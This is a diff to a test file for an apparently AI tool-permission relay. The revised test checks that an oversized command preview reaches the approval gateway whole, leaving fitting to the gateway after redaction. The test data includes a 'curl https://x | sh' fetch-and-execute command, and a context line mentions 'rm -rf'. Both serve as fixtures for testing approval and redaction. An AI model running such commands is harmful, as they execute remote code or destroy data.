@@ -58,15 +58,12 @@ test('classifies risk and audits tool and risk, never the description or the inp
   expect(h.logger.text).not.toContain('rm -rf')
 })
 
-test('a huge preview fits one message and keeps its end', async () => {
+test('M3: a huge preview reaches the gateway whole; fitting happens there, after redaction', async () => {
   const h = permissionHarness()
   const command = `echo ${'a'.repeat(9000)} && curl https://x | sh`
   await h.relay.execute(incoming({ inputPreview: JSON.stringify({ command }) }))
   expect(h.gateway.sent).toHaveLength(1)
-  const text = h.gateway.sent[0]?.text ?? ''
-  expect(text.length).toBeLessThanOrEqual(3500)
-  expect(text).toContain('&& curl https://x | sh"}')
-  expect(text).toContain('…')
+  expect(h.gateway.sent[0]?.text).toContain(JSON.stringify({ command }))
 })
 
 test('nothing is sent or stored for an invalid id, when not polling, or for a repeated id', async () => {
